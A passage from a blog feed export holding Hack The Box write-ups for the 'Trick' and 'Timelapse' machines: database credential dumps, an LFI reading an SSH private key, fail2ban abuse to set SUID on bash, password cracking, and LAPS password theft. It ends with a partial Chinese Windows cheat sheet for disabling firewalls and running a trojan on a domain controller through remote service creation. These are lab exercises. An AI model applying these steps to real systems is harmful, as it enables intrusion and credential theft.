punctuation">)</span>      <span class="token operator">|</span><span class="token operator">|</span> name      <span class="token operator">|</span> varchar<span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span> <span class="token operator">|</span><span class="token operator">|</span> password  <span class="token operator">|</span> varchar<span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span> <span class="token operator">|</span><span class="token operator">|</span> <span class="token builtin class-name">type</span>      <span class="token operator">|</span> tinyint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>   <span class="token operator">|</span><span class="token operator">|</span> username  <span class="token operator">|</span> varchar<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span> <span class="token operator">|</span>+-----------+--------------+Database: payroll_dbTable: <span class="token function">users</span><span class="token punctuation">[</span><span class="token number">1</span> entry<span class="token punctuation">]</span>+----+---------------+------------+-----------------------+<span class="token operator">|</span> <span class="token function">id</span> <span class="token operator">|</span> name          <span class="token operator">|</span> username   <span class="token operator">|</span> password              <span class="token operator">|</span>+----+---------------+------------+-----------------------+<span class="token operator">|</span> <span class="token number">1</span>  <span class="token operator">|</span> Administrator <span class="token operator">|</span> Enemigosss <span class="token operator">|</span> SuperGucciRainbowCake <span class="token operator">|</span>+----+---------------+------------+-----------------------+</code></pre><p>Using <code>Enemigosss:SuperGucciRainbowCake</code> login to site <code>http://preprod-payroll.trick.htb</code>. Nothing found, :(</p><p>Fuzzing subdomain again</p><pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/htb/Trick<span class="token punctuation">]</span>└─$ ffuf -u http://trick.htb -H <span class="token string">'Host: preprod-FUZZ.trick.htb'</span> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs <span class="token number">5480</span>        /<span class="token string">'___\  /'</span>___<span class="token punctuation">\</span>           /'___<span class="token punctuation">\</span>              /<span class="token punctuation">\</span> <span class="token punctuation">\</span>__/ /<span class="token punctuation">\</span> <span class="token punctuation">\</span>__/  __  __  /<span class="token punctuation">\</span> <span class="token punctuation">\</span>__/              <span class="token punctuation">\</span> <span class="token punctuation">\</span> ,__<span class="token punctuation">\</span><span class="token punctuation">\</span> <span class="token punctuation">\</span> ,__<span class="token punctuation">\</span>/<span class="token punctuation">\</span> <span class="token punctuation">\</span>/<span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span> ,__<span class="token punctuation">\</span>              <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span>_/ <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span>_/<span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span>_<span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span>_/               <span class="token punctuation">\</span> <span class="token punctuation">\</span>_<span class="token punctuation">\</span>   <span class="token punctuation">\</span> <span class="token punctuation">\</span>_<span class="token punctuation">\</span>  <span class="token punctuation">\</span> <span class="token punctuation">\</span>____/  <span class="token punctuation">\</span> <span class="token punctuation">\</span>_<span class="token punctuation">\</span>                 <span class="token punctuation">\</span>/_/    <span class="token punctuation">\</span>/_/   <span class="token punctuation">\</span>/___/    <span class="token punctuation">\</span>/_/              v1.3.1 Kali Exclusive <span class="token operator">&lt;</span><span class="token number">3</span>________________________________________________ :: Method           <span class="token builtin class-name">:</span> GET :: URL              <span class="token builtin class-name">:</span> http://trick.htb :: Wordlist         <span class="token builtin class-name">:</span> FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt :: Header           <span class="token builtin class-name">:</span> Host: preprod-FUZZ.trick.htb :: Follow redirects <span class="token builtin class-name">:</span> <span class="token boolean">false</span> :: Calibration      <span class="token builtin class-name">:</span> <span class="token boolean">false</span> :: Timeout          <span class="token builtin class-name">:</span> <span class="token number">10</span> :: Threads          <span class="token builtin class-name">:</span> <span class="token number">40</span> :: Matcher          <span class="token builtin class-name">:</span> Response status: <span class="token number">200,204</span>,301,302,307,401,403,405 :: Filter           <span class="token builtin class-name">:</span> Response size: <span class="token number">5480</span>________________________________________________marketing               <span class="token punctuation">[</span>Status: <span class="token number">200</span>, Size: <span class="token number">9660</span>, Words: <span class="token number">3007</span>, Lines: <span class="token number">179</span><span class="token punctuation">]</span>:: Progress: <span class="token punctuation">[</span><span class="token number">4989</span>/4989<span class="token punctuation">]</span> :: Job <span class="token punctuation">[</span><span class="token number">1</span>/1<span class="token punctuation">]</span> :: <span class="token number">91</span> req/sec :: Duration: <span class="token punctuation">[</span><span class="token number">0</span>:00:51<span class="token punctuation">]</span> :: Errors: <span class="token number">0</span> ::</code></pre><p>Add <code>preprod-marketing.trick.htb</code> to <code>/etc/hosts</code></p><h4 id="LFI"><a href="#LFI" class="headerlink" title="LFI"></a>LFI</h4><p><code>http://preprod-marketing.trick.htb/index.php?page=</code>hava LFI</p><p>Read <code>/home/michael/.ssh/id_rsa</code> to get private key</p><h3 id="User"><a href="#User" class="headerlink" title="User"></a>User</h3><pre class="language-none"><code class="language-none">chmod 600 id_rsassh michael@10.10.11.116 -i id_rsa</code></pre><p>Get user flag</p><p><code>698bb876ab3abd78fd1e7e54372b2607</code></p><h3 id="priv-esc"><a href="#priv-esc" class="headerlink" title="priv esc"></a>priv esc</h3><pre class="language-bash" data-language="bash"><code class="language-bash">michael@trick:~$ <span class="token function">sudo</span> -lMatching Defaults entries <span class="token keyword">for</span> michael on trick:    env_reset, mail_badpass, <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/usr/local/sbin<span class="token punctuation">\</span>:/usr/local/bin<span class="token punctuation">\</span>:/usr/sbin<span class="token punctuation">\</span>:/usr/bin<span class="token punctuation">\</span>:/sbin<span class="token punctuation">\</span>:/binUser michael may run the following commands on trick:    <span class="token punctuation">(</span>root<span class="token punctuation">)</span> NOPASSWD: /etc/init.d/fail2ban restart</code></pre><p>refer the blog: <a href="https://github.com/rvizx/fail2ban/blob/main/fail2ban">https://github.com/rvizx/fail2ban/blob/main/fail2ban</a></p><p>We should have privilege to change <code>/etc/fail2ban/action.d/iptables-multiport.conf</code></p><p>Although we could’n change this file, bug the <code>michael</code> user is the <code>security</code> group member</p><p>, and <code>security</code> group have permision in folder <code>/etc/fail2ban/action.d/</code></p><pre class="language-bash" data-language="bash"><code class="language-bash">michael@trick:~$ <span class="token function">ls</span> -al /etc/fail2ban/ <span class="token operator">|</span> <span class="token function">grep</span> action.ddrwxrwx---   <span class="token number">2</span> root security  <span class="token number">4096</span> Aug  <span class="token number">6</span> <span class="token number">18</span>:27 action.d</code></pre><p>So, we can replace the file in this folder</p><p>Edite the poc like this</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>INCLUDES<span class="token punctuation">]</span>before <span class="token operator">=</span> iptables-common.conf<span class="token punctuation">[</span>Definition<span class="token punctuation">]</span>actionstart <span class="token operator">=</span> <span class="token operator">&lt;</span>iptables<span class="token operator">></span> -N f2b-<span class="token operator">&lt;</span>name<span class="token operator">></span>              <span class="token operator">&lt;</span>iptables<span class="token operator">></span> -A f2b-<span class="token operator">&lt;</span>name<span class="token operator">></span> -j <span class="token operator">&lt;</span>returntype<span class="token operator">></span>              <span class="token operator">&lt;</span>iptables<span class="token operator">></span> -I <span class="token operator">&lt;</span>chain<span class="token operator">></span> -p <span class="token operator">&lt;</span>protocol<span class="token operator">></span> -m multiport --dports <span class="token operator">&lt;</span>port<span class="token operator">></span> -j f2b-<span class="token operator">&lt;</span>name<span class="token operator">></span>actionstop <span class="token operator">=</span> <span class="token operator">&lt;</span>iptables<span class="token operator">></span> -D <span class="token operator">&lt;</span>chain<span class="token operator">></span> -p <span class="token operator">&lt;</span>protocol<span class="token operator">></span> -m multiport --dports <span class="token operator">&lt;</span>port<span class="token operator">></span> -j f2b-<span class="token operator">&lt;</span>name<span class="token operator">></span>             <span class="token operator">&lt;</span>actionflush<span class="token operator">></span>             <span class="token operator">&lt;</span>iptables<span class="token operator">></span> -X f2b-<span class="token operator">&lt;</span>name<span class="token operator">></span>actioncheck <span class="token operator">=</span> <span class="token operator">&lt;</span>iptables<span class="token operator">></span> -n -L <span class="token operator">&lt;</span>chain<span class="token operator">></span> <span class="token operator">|</span> <span class="token function">grep</span> -q <span class="token string">'f2b-&lt;name>[ \t]'</span>actionban <span class="token operator">=</span> <span class="token function">chmod</span> <span class="token number">4755</span> /bin/bashactionunban <span class="token operator">=</span> <span class="token operator">&lt;</span>iptables<span class="token operator">></span> -D f2b-<span class="token operator">&lt;</span>name<span class="token operator">></span> -s <span class="token operator">&lt;</span>ip<span class="token operator">></span> -j <span class="token operator">&lt;</span>blocktype<span class="token operator">></span><span class="token punctuation">[</span>Init<span class="token punctuation">]</span></code></pre><pre class="language-none"><code class="language-none">michael@trick:~$ mv iptables-multiport.conf &#x2F;etc&#x2F;fail2ban&#x2F;action.d&#x2F;iptables-multiport.confmv: replace &#39;&#x2F;etc&#x2F;fail2ban&#x2F;action.d&#x2F;iptables-multiport.conf&#39;, overriding mode 0644 (rw-r--r--)? ymichael@trick:~$ sudo &#x2F;etc&#x2F;init.d&#x2F;fail2ban restart[ ok ] Restarting fail2ban (via systemctl): fail2ban.service.</code></pre><p>After restart the fail2ban service, we should ban ourselves by login fail to ssh a lot of times, later the bash will have suid</p><pre class="language-bash" data-language="bash"><code class="language-bash">michael@trick:~$ <span class="token function">bash</span> -pbash-5.0<span class="token comment"># id</span><span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">1001</span><span class="token punctuation">(</span>michael<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1001</span><span class="token punctuation">(</span>michael<span class="token punctuation">)</span> <span class="token assign-left variable">euid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">1001</span><span class="token punctuation">(</span>michael<span class="token punctuation">)</span>,1002<span class="token punctuation">(</span>security<span class="token punctuation">)</span>bash-5.0<span class="token comment"># cat /root/root.txt</span>de1ea7b2f28daef221556dece37f8abe</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> HTB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[HTB] Timelapse</title>
      <link href="/posts/628d110.html"/>
      <url>/posts/628d110.html</url>
      
        <content type="html"><![CDATA[<h1 id="Foreword"><a href="#Foreword" class="headerlink" title="Foreword"></a>Foreword</h1><p>There is no Chinese input method in kali, please forgive my English level</p><h1 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h1><h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><pre class="language-none"><code class="language-none">┌──(root💀kali)-[~]    └─# nmap -sC -sV -T4 10.10.11.152                                                                                                                        1 ⚙Starting Nmap 7.92 ( https:&#x2F;&#x2F;nmap.org ) at 2022-04-08 16:17 CSTNmap scan report for 10.10.11.152Host is up (0.58s latency).Not shown: 989 filtered tcp ports (no-response)PORT     STATE SERVICE       VERSION53&#x2F;tcp   open  domain        Simple DNS Plus88&#x2F;tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-04-08 16:19:48Z)135&#x2F;tcp  open  msrpc         Microsoft Windows RPC139&#x2F;tcp  open  netbios-ssn   Microsoft Windows netbios-ssn389&#x2F;tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)445&#x2F;tcp  open  microsoft-ds?464&#x2F;tcp  open  kpasswd5?593&#x2F;tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0636&#x2F;tcp  open  tcpwrapped3268&#x2F;tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)3269&#x2F;tcp open  tcpwrappedService Info: Host: DC01; OS: Windows; CPE: cpe:&#x2F;o:microsoft:windowsHost script results:|_clock-skew: 8h01m34s| smb2-security-mode: |   3.1.1: |_    Message signing enabled and required| smb2-time: |   date: 2022-04-08T16:20:31|_  start_date: N&#x2F;AService detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .Nmap done: 1 IP address (1 host up) scanned in 135.90 seconds</code></pre><p>Add domain <code>timelapse.htb</code> to <code>etc/hosts</code></p><h2 id="Out-of-domain-username-enumeration"><a href="#Out-of-domain-username-enumeration" class="headerlink" title="Out-of-domain username enumeration"></a>Out-of-domain username enumeration</h2><pre class="language-none"><code class="language-none">┌──(root💀kali)-[&#x2F;opt&#x2F;tools&#x2F;domain_tools]└─# .&#x2F;kerbrute userenum -d timelapse.htb &#x2F;usr&#x2F;share&#x2F;seclists&#x2F;Usernames&#x2F;top-usernames-shortlist.txt --dc 10.10.11.152                                     1 ⚙    __             __               __        &#x2F; &#x2F;_____  _____&#x2F; &#x2F;_  _______  __&#x2F; &#x2F;____   &#x2F; &#x2F;&#x2F;_&#x2F; _ \&#x2F; ___&#x2F; __ \&#x2F; ___&#x2F; &#x2F; &#x2F; &#x2F; __&#x2F; _ \ &#x2F; ,&lt; &#x2F;  __&#x2F; &#x2F;  &#x2F; &#x2F;_&#x2F; &#x2F; &#x2F;  &#x2F; &#x2F;_&#x2F; &#x2F; &#x2F;_&#x2F;  __&#x2F;&#x2F;_&#x2F;|_|\___&#x2F;_&#x2F;  &#x2F;_.___&#x2F;_&#x2F;   \__,_&#x2F;\__&#x2F;\___&#x2F;                                        Version: v1.0.3 (9dad6e1) - 04&#x2F;08&#x2F;22 - Ronnie Flathers @ropnop2022&#x2F;04&#x2F;08 16:50:09 &gt;  Using KDC(s):2022&#x2F;04&#x2F;08 16:50:09 &gt;   10.10.11.152:882022&#x2F;04&#x2F;08 16:50:10 &gt;  [+] VALID USERNAME:       guest@timelapse.htb2022&#x2F;04&#x2F;08 16:50:10 &gt;  [+] VALID USERNAME:       administrator@timelapse.htb2022&#x2F;04&#x2F;08 16:50:11 &gt;  Done! Tested 17 usernames (2 valid) in 1.377 seconds</code></pre><h2 id="smbmap"><a href="#smbmap" class="headerlink" title="smbmap"></a>smbmap</h2><pre class="language-none"><code class="language-none">┌──(kali㉿kali)-[~]└─$ smbmap -H 10.10.11.152 -u guest[+] IP: 10.10.11.152:445        Name: timelapse.htb                                             Disk                                                    Permissions     Comment        ----                                                    -----------     -------        ADMIN$                                                  NO ACCESS       Remote Admin        C$                                                      NO ACCESS       Default share        IPC$                                                    READ ONLY       Remote IPC        NETLOGON                                                NO ACCESS       Logon server share         Shares                                                  READ ONLY        SYSVOL                                                  NO ACCESS       Logon server share</code></pre><p>using the smbmap can found <code>Shares</code> have read privilege</p><p>try to login with guest by smbclient, there have a backup zip file</p><pre class="language-none"><code class="language-none">┌──(root💀kali)-[&#x2F;opt&#x2F;tools&#x2F;domain_tools]└─# smbclient -U guest -W timelapse.htb &#x2F;&#x2F;timelapse.htb&#x2F;Shares                                                                                     130 ⨯ 1 ⚙Enter TIMELAPSE.HTB\guest&#39;s password: Try &quot;help&quot; to get a list of possible commands.smb: \&gt; ls  .                                   D        0  Mon Oct 25 23:39:15 2021  ..                                  D        0  Mon Oct 25 23:39:15 2021  Dev                                 D        0  Tue Oct 26 03:40:06 2021  HelpDesk                            D        0  Mon Oct 25 23:48:42 2021                6367231 blocks of size 4096. 1382234 blocks availablesmb: \&gt; cd devsmb: \dev\&gt; ls  .                                   D        0  Tue Oct 26 03:40:06 2021  ..                                  D        0  Tue Oct 26 03:40:06 2021  winrm_backup.zip                    A     2611  Mon Oct 25 23:46:42 2021                6367231 blocks of size 4096. 1382218 blocks available</code></pre><p>get it!</p><h2 id="Brute-password"><a href="#Brute-password" class="headerlink" title="Brute password"></a>Brute password</h2><p>unzip the backup file need password</p><p>so, I should find the password at first</p><pre class="language-none"><code class="language-none">┌──(kali㉿kali)-[~]└─$ zip2john winrm_backup.zip &gt; hash.txt                   ┌──(kali㉿kali)-[~]└─$ john hash.txt --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt Using default input encoding: UTF-8Loaded 1 password hash (PKZIP [32&#x2F;64])Will run 4 OpenMP threadsPress &#39;q&#39; or Ctrl-C to abort, almost any other key for statussupremelegacy    (winrm_backup.zip&#x2F;legacyy_dev_auth.pfx)     1g 0:00:00:00 DONE (2022-04-08 17:54) 3.846g&#x2F;s 13359Kp&#x2F;s 13359Kc&#x2F;s 13359KC&#x2F;s surki..superkeep16Use the &quot;--show&quot; option to display all of the cracked passwords reliablySession completed</code></pre><p>get password <code>supremelegacy</code></p><p>unzip the to get <code>legacyy_dev_auth.pfx</code> file. This file also should password to open, using john too</p><pre class="language-none"><code class="language-none">python pfx2john.py ~&#x2F;legacyy_dev_auth.pfx &gt; ~&#x2F;pfx_hash.txtjohn pfx_hash.txt --format&#x3D;pfx --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt</code></pre><p>get password: <code>thuglegacy</code></p><p>unlock the pfx file, I found a file named <code>Legacyy</code> in it, and the name is a vaild username in kerberos</p><pre class="language-none"><code class="language-none">    __             __               __        &#x2F; &#x2F;_____  _____&#x2F; &#x2F;_  _______  __&#x2F; &#x2F;____   &#x2F; &#x2F;&#x2F;_&#x2F; _ \&#x2F; ___&#x2F; __ \&#x2F; ___&#x2F; &#x2F; &#x2F; &#x2F; __&#x2F; _ \ &#x2F; ,&lt; &#x2F;  __&#x2F; &#x2F;  &#x2F; &#x2F;_&#x2F; &#x2F; &#x2F;  &#x2F; &#x2F;_&#x2F; &#x2F; &#x2F;_&#x2F;  __&#x2F;&#x2F;_&#x2F;|_|\___&#x2F;_&#x2F;  &#x2F;_.___&#x2F;_&#x2F;   \__,_&#x2F;\__&#x2F;\___&#x2F;                                        Version: v1.0.3 (9dad6e1) - 04&#x2F;08&#x2F;22 - Ronnie Flathers @ropnop2022&#x2F;04&#x2F;08 18:49:18 &gt;  Using KDC(s):2022&#x2F;04&#x2F;08 18:49:18 &gt;   10.10.11.152:882022&#x2F;04&#x2F;08 18:49:18 &gt;  [+] VALID USERNAME:       Legacyy@timelapse.htb2022&#x2F;04&#x2F;08 18:49:18 &gt;  Done! Tested 1 usernames (1 valid) in 0.320 seconds</code></pre><h1 id="User-flag"><a href="#User-flag" class="headerlink" title="User flag"></a>User flag</h1><p>I try to brute legacyy’s password by kerbrute, but fail</p><p>so, let back to where we started. We found a backup file, which name is <code>winrm_backup.zip</code>. Unzip the compressed file, We get the <code>legacyy_dev_auth.pfx</code></p><p>Maybe the winrm is a component or service in windows. I try to search it in google and I get the explain by Microsoft.</p><blockquote><p>Windows Remote Management (WinRM) is the Microsoft implementation of WS-Management Protocol, a standard Simple Object Access Protocol (SOAP)-based, firewall-friendly protocol that allows hardware and operating systems, from different vendors, to interoperate.</p></blockquote><p>I consider the winrm is similar to SSH. So the credentials are also required.</p><p>As we all know, the pfx file usually contains the X.509 certificate and private key, and the <code>legacyy_dev_auth.pfx</code> we haven’t use yet. So I think the pfx can be used for authentication in winrm. Let’s separate the private key and X.509 certficate from the pfx file.</p><pre class="language-bash" data-language="bash"><code class="language-bash">openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out Legacyy.pemopenssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out cert.key -nodes</code></pre><p>Now, the problem is how to connect windows by winrm in linux (kali). I found a tool named <code>evil-winrm</code> in <a href="https://github.com/Hackplayers/evil-winrm">github</a>, which can connect to remote computer by winrm and use certificates for Authentication. Installation is simple in kali: <code>sudo apt-get install evil-winrm</code></p><p>Let’s connect!</p><pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>└─$ evil-winrm -i <span class="token number">10.10</span>.11.152 -S -c Legacyy.pem -k cert.key Evil-WinRM shell v3.3Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">function</span> is unimplemented on this machineData: For <span class="token function">more</span> information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm<span class="token comment">#Remote-path-completion</span>Warning: SSL enabledInfo: Establishing connection to remote endpoint*Evil-WinRM* PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>legacyy<span class="token punctuation">\</span>Documents<span class="token operator">></span> <span class="token function">whoami</span>timelapse<span class="token punctuation">\</span>legacyy</code></pre><p>get user flag in <code>c:\users\legacyy\desktop\user.txt</code></p><h1 id="Root-flag"><a href="#Root-flag" class="headerlink" title="Root flag"></a>Root flag</h1><p>After a long and futile enumeration, Prompted by <code>pyp</code> in <a href="https://forum.hackthebox.com/t/official-timelapse-discussion/254385/4?u=k0to">forum</a> and this <a href="https://0xdf.gitlab.io/2018/11/08/powershell-history-file.html">blog</a>, I found the powershell history file</p><pre class="language-bash" data-language="bash"><code class="language-bash">*Evil-WinRM* PS C:<span class="token punctuation">\</span>users<span class="token punctuation">\</span>legacyy<span class="token punctuation">\</span>appdata<span class="token punctuation">\</span>Roaming<span class="token punctuation">\</span>Microsoft<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>PowerShell<span class="token punctuation">\</span>PSReadLine<span class="token operator">></span> <span class="token builtin class-name">type</span> ConsoleHost_history.txt<span class="token function">whoami</span>ipconfig /all<span class="token function">netstat</span> -ano <span class="token operator">|</span>select-string LIST<span class="token variable">$so</span> <span class="token operator">=</span> New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck<span class="token variable">$p</span> <span class="token operator">=</span> ConvertTo-SecureString <span class="token string">'E3R$Q62^12p7PLlC%KWaxuaV'</span> -AsPlainText -Force<span class="token variable">$c</span> <span class="token operator">=</span> New-Object System.Management.Automation.PSCredential <span class="token punctuation">(</span><span class="token string">'svc_deploy'</span>, <span class="token variable">$p</span><span class="token punctuation">)</span>invoke-command -computername localhost -credential <span class="token variable">$c</span> -port <span class="token number">5986</span> -usessl -SessionOption <span class="token variable">$so</span> -scriptblock <span class="token punctuation">&#123;</span>whoami<span class="token punctuation">&#125;</span>get-aduser -filter * -properties *<span class="token builtin class-name">exit</span></code></pre><p>WOW, there have svc_deploy’s credentials. following the history commands, we can execute commands as svc_deploy user</p><pre class="language-none"><code class="language-none">GROUP INFORMATION-----------------Group Name                                  Type             SID                                          Attributes&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;Everyone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled groupBUILTIN\Remote Management Users             Alias            S-1-5-32-580                                 Mandatory group, Enabled by default, Enabled groupBUILTIN\Users                               Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled groupBUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\This Organization              Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled groupTIMELAPSE\LAPS_Readers                      Group            S-1-5-21-671920749-559770252-3318990721-2601 Mandatory group, Enabled by default, Enabled groupAuthentication authority asserted identity  Well-known group S-1-18-1                                     Mandatory group, Enabled by default, Enabled groupMandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448</code></pre><p>The svc_deploy user is a member of the<code>LAPS_Readers</code> group. After some googling, I found that <code>LAPS_Readers</code> group members can read the password of the administrator user</p><pre class="language-none"><code class="language-none">invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock &#123;Get-ADComputer -Identity dc01 -properties * | findstr ms-Mcs-AdmPwd&#125;</code></pre><p>I got the password of administrator!</p><pre class="language-none"><code class="language-none">ms-Mcs-AdmPwd                        : )Vls1+OD0%8WlDdJ6Q)G!4)-ms-Mcs-AdmPwdExpirationTime          : 132943373149524209</code></pre><p>Now, login as administrator!</p><pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>└─$ evil-winrm -i <span class="token number">10.10</span>.11.152 -S -u administrator -p <span class="token string">')Vls1+OD0%8WlDdJ6Q)G!4)-'</span>                                                                       <span class="token number">130</span> ⨯Evil-WinRM shell v3.3Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">function</span> is unimplemented on this machineData: For <span class="token function">more</span> information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm<span class="token comment">#Remote-path-completion</span>Warning: SSL enabledInfo: Establishing connection to remote endpoint*Evil-WinRM* PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Administrator<span class="token punctuation">\</span>Documents<span class="token operator">></span> <span class="token function">whoami</span>timelapse<span class="token punctuation">\</span>administrator</code></pre><p>Get root.txt in <code>c:\users\TRX\desktop\root.txt</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> HTB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windwos 命令备忘录</title>
      <link href="/posts/cfde7db2.html"/>
      <url>/posts/cfde7db2.html</url>
      
        <content type="html"><![CDATA[<h1 id="netsh-关闭防火墙"><a href="#netsh-关闭防火墙" class="headerlink" title="netsh 关闭防火墙"></a>netsh 关闭防火墙</h1><pre class="language-none"><code class="language-none">netsh advfilewall set publicprofile state offnetsh advfirewall set allprofiles state off</code></pre><h1 id="netsh-端口转发"><a href="#netsh-端口转发" class="headerlink" title="netsh 端口转发"></a>netsh 端口转发</h1><pre class="language-none"><code class="language-none"># 开启转发netsh interface portproxy add v4tov4 listenaddress&#x3D;LOCAL_ADDRESS listenport&#x3D;LOCAL_PORT connectaddress&#x3D;DEST_ADDRESS connectport&#x3D;DEST_PORT# 查看存在的转发netsh interface portproxy show all# 删除指定规则netsh interface portproxy delete v4tov4 listenport&#x3D;LOCAL_PORT listenaddress&#x3D;LOCAL_ADDRESS</code></pre><h1 id="sc-创建服务"><a href="#sc-创建服务" class="headerlink" title="sc 创建服务"></a>sc 创建服务</h1><p>基本用法</p><pre class="language-none"><code class="language-none">sc create &lt;SERVICE_NAME&gt; binpath&#x3D; &quot;&lt;COMMEND&gt;&quot;sc description &lt;SERVICE_NAME&gt;   &quot;DESCRIPTION&quot; 设置服务的描述字符串 sc config &lt;SERVICE_NAME&gt;   start&#x3D; auto  设置这个服务为自动启动 net start &lt;SERVICE_NAME&gt;   启动服务</code></pre><p>可以通过 IPC 连接在远程主机上创建服务</p><pre class="language-none"><code class="language-none"># 关闭域控防火墙sc \\\\DC create wall binpath&#x3D; &quot;netsh advfirewall set allprofiles state off&quot;sc \\\\DC start wall# 执行木马sc \\\\DC create shell binpath&#x3D; &quot;c:\\shell.exe&quot;sc \\\\DC start shell</code></pre><h1 id="开关-3389-端口"><a href="#开关-3389-端口" class="headerlink" title="开关 3389 端口"></a>开关 3389 端口</h1><pre class="language-none"><code class="language-none"># 开启REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;f# 关闭REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 11111111 &#x2F;f</code></pre><h1 id="开关-RDP"><a href="#开关-RDP" class="headerlink" title="开关 RDP"></a>开关 RDP</h1><pre class="language-none"><code class="language-none"># 开启wmic RDTOGGLE WHERE ServerName&#x3D;&#39;%COMPUTERNAME%&#39; call 